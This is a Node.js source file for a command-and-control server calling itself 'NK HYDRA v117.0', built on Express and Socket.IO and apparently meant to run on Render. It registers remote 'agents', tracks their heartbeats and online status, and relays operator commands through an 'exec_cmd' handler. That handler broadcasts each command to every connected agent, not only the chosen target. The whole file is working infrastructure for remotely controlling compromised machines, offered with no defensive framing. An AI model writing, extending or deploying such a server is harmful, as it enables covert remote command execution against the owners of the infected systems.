// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v117.0 [BROADCAST + HEARTBEAT]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.send('HYDRA C2 v117.0 [ACTIVE]'); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 10000, 
    pingTimeout: 50000,
    transports: ['polling', 'websocket']
});

let agents = []; 

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            return;
        }

        console.log(`[+] Agent Identified: ${data.id}`);
        
        const existingIndex = agents.findIndex(a => a.id === data.id);
        if (existingIndex > -1) {
            agents[existingIndex].socketId = socket.id;
            agents[existingIndex].status = 'Online';
            agents[existingIndex].lastSeen = Date.now();
        } else {
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
        }
        
        io.to('ui_room').emit('agents_list', agents);
    });

    // KEEP ALIVE HANDLER
    socket.on('heartbeat', (data) => {
        const agent = agents.find(a => a.id === data.id);
        if (agent) {
            agent.lastSeen = Date.now();
            agent.status = 'Online';
            // Only emit list update if status changed effectively
            // io.to('ui_room').emit('agents_list', agents); 
        }
    });

    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] ${cmd} -> ${targetId}`);
        
        io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });

        // v117: BROADCAST FALLBACK
        // If target is 'all' OR we want to guarantee delivery, we broadcast.
        io.emit('exec_cmd', { cmd }); 
    });
    
    socket.on('agent_event', (data) => {
        io.to('ui_room').emit('agent_event', data);
    });

    socket.on('disconnect', (reason) => {
        console.log(`[!] Disconnect: ${socket.id} (${reason})`);
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v117 LISTENING ON ${PORT}`));
